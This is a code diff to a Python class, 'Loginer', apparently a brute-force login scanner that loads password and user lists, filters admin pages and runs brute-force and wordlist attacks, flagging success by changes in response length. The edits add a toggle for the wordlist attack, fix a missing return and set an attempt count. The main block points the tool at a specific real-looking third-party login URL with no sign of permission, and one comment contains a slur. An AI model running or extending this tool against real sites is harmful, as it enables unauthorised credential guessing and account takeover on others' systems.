@@ -18,6 +18,10 @@ class Loginer:
 		self.filtered_pages = []
 		self.passwords = open('assets/passwords.txt').readlines()
 		self.users = open('assets/users.txt').readlines()
+
+		# refactor this retarted way of passing True or False TODO!
+		# self.vocabulary = configer.settings["vocabulary"] 
+		print(configer.settings)
 		# TODO
 
 	def start_hack(self):
@@ -27,8 +31,9 @@ class Loginer:
 		self.filter_pages(self.adminpages)
 		print(bcolors.OKGREEN + "---------------------------Bruteforce check--------------------------------")
 		self.bruteforce_attack(self.filtered_pages)
-		print(bcolors.OKGREEN + "---------------------------Vocabulary attack-------------------------------")
-		self.vocabulary_attack(self.filtered_pages)
+		if self.vocabulary:
+			print(bcolors.OKGREEN + "---------------------------Vocabulary attack-------------------------------")
+			self.vocabulary_attack(self.filtered_pages)
 		print(bcolors.OKGREEN + "---------------------------------------------------------------------------")
 		print(bcolors.OKGREEN + "-------------------------Loginer scan finished-----------------------------")
 		print(bcolors.OKGREEN + "---------------------------------------------------------------------------")
@@ -37,6 +42,7 @@ class Loginer:
 		"""Return HTML page from url"""
 		try:
 			res = requests.get(url)
+			return res.text
 		except:
 			return None
 
@@ -125,7 +131,7 @@ class Loginer:
 						if not average:
 							average = len(res.text)
 						elif abs(average - len(res.text)) >= 100:
-							print(bcolors.CYAN + "login successful!" + bcolors.OKGREEN)
+							print(bcolors.CYAN + "    login successful!" + bcolors.OKGREEN)
 					attempts += 1
 
 				else:
@@ -143,7 +149,7 @@ class Loginer:
 	def bruteforce_attack(self, page_urls):
 		stats = {}
 		for page in page_urls:
-			attempts = self.bruteforce_url(page)
+			attempts = self.bruteforce_url(page, 10)
 			if attempts:
 				stats["page"] = attempts
 		if stats:
@@ -161,7 +167,10 @@ class Loginer:
 if __name__ == "__main__":
 	from configer import Configer
 
-	settings = {"local": False, "page_limit": None,}
+	settings = {"local": False,
+            "page_limit": None,
+            "vocabulary": False,
+            }
 	c = Configer("https://inmac.org/login/", settings)
 	log = Loginer(c)
 	
